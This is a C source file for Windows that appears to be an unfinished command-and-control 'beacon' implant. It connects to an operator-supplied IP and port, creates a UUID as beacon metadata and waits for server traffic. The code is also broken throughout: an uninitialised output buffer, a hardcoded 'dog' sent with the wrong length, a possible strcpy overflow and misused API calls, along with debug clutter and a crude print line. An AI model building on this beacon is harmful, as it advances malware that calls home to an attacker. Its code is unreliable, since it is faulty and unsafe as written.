#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <rpcdce.h>
#include <wincrypt.h>
#include <stdbool.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "rpcrt4.lib")


BOOL send_all(int socket, void *buffer, size_t length)
{
    char *ptr = (char*) buffer;
    while (length > 0)
    {
        int i = send(socket, ptr, length, 0);
        if (i < 1) return false;
        ptr += i;
        length -= i;
    }
    return true;
}



void beacon_connect_to_server(char IP[16], int PORT){
    WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		printf("[ERROR] WSASturtup failed.\n");
	}


    // INIT SOCKET = AF_INET (IPv4), SOCK_STREAM (Stream), IPPROTO_TCP (TCP)
    SOCKET s =  WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); 
    //printf("\n%d", s);
    // IP+PORT SPEC
    int iResult;
    int jResult;
    //printf("\n\n\nasasasasasa");
    struct sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr(IP);
    clientService.sin_port = htons(PORT);
    //printf("asasasasasa");

    // Connect to server.
    iResult = connect(s, (struct sockaddr*) &clientService, sizeof (clientService));
    //printf("%d", iResult);


    // Generate and send beacon metadata     
    //// Generate UUID
    int recvbuflen = 4098;
    UUID uuid;
    UuidCreate(&uuid);
    char stringified_UUID[128];
    UuidToString(&uuid, (RPC_CSTR*) stringified_UUID);
    char *sendbuf = stringified_UUID;
    char recvbuf[recvbuflen];

    // base64 encode the UUID of the beacon
    char b64size[8];
    DWORD strcount;
    char *UUID_BUFFER;
    BOOL res = CryptBinaryToStringA(sendbuf, 128, 1, UUID_BUFFER, &strcount);
    //printf("\nBASE64\n");

    //// Send metadata
    
    printf("\n%s\n", UUID_BUFFER);
    printf("\nSENDBUF\n");
    send_all(s, "dog", (int)strlen(sendbuf)); 
  
    
    
    // Receive until the peer closes the connection
    do {
        iResult = recv(s, recvbuf, recvbuflen, 0);
        //printf("\nWAAROM JIJ SLUITEN\n");
    } while( iResult >= 0 );
    
    
    
    // Close the socket
    iResult = shutdown(s, SD_SEND);
    printf("%d", iResult);
    jResult = closesocket(s);
    printf("%d", jResult);

    // Random print
    printf("bobs & vagene %s:%d\n", IP, PORT);

}

int main(int argc, char *argv[]) {
    if( argc == 3 ) {
        char IP [16]; strcpy(IP, argv[1]);
        int PORT = atoi(argv[2]);
        //printf("asasasasasa");
        beacon_connect_to_server(IP, PORT);
    }
    else if( argc > 3 ) {
        printf("Too many arguments supplied.\n");
    }
    else {
        printf("Two argument expected.\n");
    }
    return 0;
}